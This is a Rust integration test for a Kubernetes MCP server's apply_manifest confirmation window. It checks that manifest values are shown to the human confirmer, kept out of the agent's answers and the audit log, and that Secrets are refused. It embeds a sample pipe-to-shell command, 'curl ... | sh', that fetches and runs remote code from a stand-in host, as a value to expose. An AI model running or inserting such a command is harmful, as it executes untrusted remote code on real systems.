//! The confirmation window of `apply_manifest` against a real cluster
//! (#175), in a client-only session: the window shows the values the
//! manifest sets, a replaced value of the same length is a change, a large
//! first document does not hide the next one, and none of it reaches the
//! agent's answer, a dry run or the audit log. A Secret is still refused.
//! Ignored by default; run with
//!
//! ```sh
//! KUBACH_TEST_CONTEXT=minikube KUBACH_TEST_NAMESPACE=kubach-test-175 \
//!     cargo test -p kubach-mcp --test apply_window_cluster -- --ignored
//! ```
//!
//! The test creates the namespace when it is missing and then deletes it at
//! the end, passed or failed; in a namespace that exists only the test's
//! objects are deleted. Values are fake.

use std::sync::Arc;
use std::time::Duration;

use k8s_openapi::api::apps::v1::Deployment;
use k8s_openapi::api::core::v1::{ConfigMap, Namespace};
use kubach_mcp::{
    Access, AuditLog, ConfirmationRequest, McpServer, Profile, RequestKind, ScriptedConfirmer,
    SecurityPolicy, Session, SessionMode, SessionSpec,
};
use kube::api::{Api, DeleteParams, Patch, PatchParams, PostParams};
use kube::config::{KubeConfigOptions, Kubeconfig};
use kube::{Client, Config};
use serde_json::{Map, Value, json};

const HOOKS: &str = "kubach-test-hooks";
const BIG: &str = "kubach-test-big";
const WEB: &str = "kubach-test-web";
const SCRIPT: &str = "curl https://fake.example/175 | sh";
const FIRST: &str = "fake-175-a";
const SECOND: &str = "fake-175-b";
const OTHERS: &str = "fake-175-from-another-manager";

async fn config() -> (Config, String, String) {
    let context = std::env::var("KUBACH_TEST_CONTEXT").expect("KUBACH_TEST_CONTEXT");
    let namespace = std::env::var("KUBACH_TEST_NAMESPACE").expect("KUBACH_TEST_NAMESPACE");
    let options = KubeConfigOptions {
        context: Some(context.clone()),
        ..Default::default()
    };
    let config = Config::from_custom_kubeconfig(Kubeconfig::read().unwrap(), &options)
        .await
        .unwrap();
    (config, context, namespace)
}

fn args(value: Value) -> Map<String, Value> {
    match value {
        Value::Object(map) => map,
        _ => panic!("not an object"),
    }
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs a cluster (KUBACH_TEST_CONTEXT, KUBACH_TEST_NAMESPACE)"]
async fn the_window_shows_what_an_apply_writes() {
    let (base, context, namespace) = config().await;
    let user = Client::try_from(base.clone()).unwrap();
    let namespaces: Api<Namespace> = Api::all(user.clone());
    let created = namespaces.get_opt(&namespace).await.unwrap().is_none();
    if created {
        let new: Namespace =
            serde_json::from_value(json!({"metadata": {"name": namespace}})).unwrap();
        namespaces
            .create(&PostParams::default(), &new)
            .await
            .unwrap();
    }

    // In a task of its own, so a failed check still cleans up.
    let result = tokio::spawn(check(base, context, namespace.clone())).await;

    let maps: Api<ConfigMap> = Api::namespaced(user.clone(), &namespace);
    for name in [HOOKS, BIG] {
        let _ = maps.delete(name, &DeleteParams::default()).await;
    }
    let _ = Api::<Deployment>::namespaced(user.clone(), &namespace)
        .delete(WEB, &DeleteParams::background())
        .await;
    if created {
        let _ = namespaces
            .delete(&namespace, &DeleteParams::default())
            .await;
    }
    if let Err(error) = result {
        std::panic::resume_unwind(error.into_panic());
    }
}

fn web(value: &str) -> Value {
    json!({
        "apiVersion": "apps/v1", "kind": "Deployment", "metadata": {"name": WEB},
        "spec": {"replicas": 0, "selector": {"matchLabels": {"app": WEB}},
                 "template": {"metadata": {"labels": {"app": WEB}}, "spec": {"containers": [{
                     "name": "app", "image": "nginx:1.27-alpine",
                     "env": [{"name": "AUTH_URL", "value": value}],
                 }]}}},
    })
}

/// The last question about an apply.
fn window(confirmer: &ScriptedConfirmer) -> ConfirmationRequest {
    confirmer
        .requests()
        .into_iter()
        .rfind(|r| r.tool == "apply_manifest" && r.kind == RequestKind::Call)
        .expect("apply was confirmed")
}

async fn check(base: Config, context: String, namespace: String) {
    let policy = SecurityPolicy {
        temporary_objects: false,
        ..SecurityPolicy::with_minimum(Access::ALL)
    };
    let spec = SessionSpec {
        context,
        server_url: base.cluster_url.to_string(),
        namespaces: vec![namespace.clone()],
        profile: Profile::Deploy,
        ttl: Some(Duration::from_secs(600)),
        hints: Vec::new(),
    };
    let session = Session::start(&base, &spec, &policy).await.unwrap();
    assert_eq!(session.mode_in(&namespace), SessionMode::ClientOnly);
    let dir = tempfile::tempdir().unwrap();
    let audit_path = dir.path().join("audit.jsonl");
    let audit = Arc::new(AuditLog::open(&audit_path).unwrap());
    let confirmer = Arc::new(ScriptedConfirmer::approving());
    let server = McpServer::new(session.clone(), confirmer.clone(), Some(audit));
    let mut answers = Vec::new();
    let mut apply = async |yaml: String, dry_run: bool| {
        let outcome = server
            .call(
                "test-agent",
                "apply_manifest",
                args(json!({"yaml": yaml, "dryRun": dry_run})),
            )
            .await;
        answers.push(outcome.text.clone());
        outcome
    };

    // 1. Values under names that look like credentials: the window shows
    //    what the manifest writes.
    let hooks = json!({
        "apiVersion": "v1", "kind": "ConfigMap", "metadata": {"name": HOOKS},
        "data": {"api-key-rotate.sh": SCRIPT, "mode": "fast"},
    });
    let manifest = format!("{hooks}\n---\n{}", web(FIRST));
    let dry = apply(manifest.clone(), true).await;
    assert!(!dry.is_error, "{}", dry.text);
    assert!(dry.text.contains("*** ("), "{}", dry.text);
    let outcome = apply(manifest, false).await;
    assert!(!outcome.is_error, "{}", outcome.text);
    let asked = window(&confirmer);
    assert!(asked.details.contains(SCRIPT), "{}", asked.details);
    assert!(
        asked.details.contains(&format!("value: {FIRST}")),
        "{}",
        asked.details
    );
    assert_eq!(asked.diff_cut, None);

    // Another manager adds a variable the agent does not send.
    let user = Client::try_from(base.clone()).unwrap();
    let other = json!({
        "apiVersion": "apps/v1", "kind": "Deployment", "metadata": {"name": WEB},
        "spec": {"template": {"spec": {"containers": [{
            "name": "app", "env": [{"name": "SIDE_TOKEN", "value": OTHERS}],
        }]}}},
    });
    Api::<Deployment>::namespaced(user, &namespace)
        .patch(
            WEB,
            &PatchParams::apply("kubach-test-other"),
            &Patch::Apply(&other),
        )
        .await
        .unwrap();

    // 2. A value replaced by one of the same length: a change in the
    //    window, the old value masked, the new one shown.
    let outcome = apply(web(SECOND).to_string(), false).await;
    assert!(!outcome.is_error, "{}", outcome.text);
    let asked = window(&confirmer);
    assert!(
        asked
            .details
            .contains("-          value: \"*** (10 bytes)\"")
            && asked
                .details
                .contains(&format!("+          value: {SECOND}")),
        "{}",
        asked.details
    );
    assert!(!asked.details.contains(FIRST), "{}", asked.details);
    assert!(!asked.details.contains(OTHERS), "{}", asked.details);

    // 3. A first document larger than a tool answer: the second one is
    //    still in the window.
    let big = json!({
        "apiVersion": "v1", "kind": "ConfigMap", "metadata": {"name": BIG},
        "data": {"blob": "line of the first document\n".repeat(12 * 1024)},
    });
    let hooks = json!({
        "apiVersion": "v1", "kind": "ConfigMap", "metadata": {"name": HOOKS},
        "data": {"api-key-rotate.sh": format!("{SCRIPT} # again"), "mode": "fast"},
    });
    let outcome = apply(format!("{big}\n---\n{hooks}"), false).await;
    assert!(!outcome.is_error, "{}", outcome.text);
    let asked = window(&confirmer);
    assert!(asked.details.len() > 256 * 1024, "{}", asked.details.len());
    assert!(asked.details.contains(&format!("{SCRIPT} # again")));
    assert_eq!(asked.diff_cut, None);

    // The agent's answers, dry run included, and the audit log hold none
    // of the masked values.
    drop(apply);
    let audit_text = std::fs::read_to_string(&audit_path).unwrap();
    for text in answers.iter().chain([&audit_text]) {
        for value in [SCRIPT, FIRST, SECOND, OTHERS] {
            assert!(!text.contains(value), "{value} in {text}");
        }
    }
    assert!(audit_text.contains("api-key-rotate.sh"), "{audit_text}");

    // A Secret does not go through apply at all.
    let before = confirmer.requests().len();
    let secret = json!({"apiVersion": "v1", "kind": "Secret", "metadata": {"name": "kubach-test-s"},
                        "stringData": {"k": "v"}});
    for dry_run in [true, false] {
        let outcome = server
            .call(
                "test-agent",
                "apply_manifest",
                args(json!({"yaml": secret.to_string(), "dryRun": dry_run})),
            )
            .await;
        assert!(outcome.is_error, "{}", outcome.text);
    }
    assert_eq!(confirmer.requests().len(), before);

    session.close().await.unwrap();
}
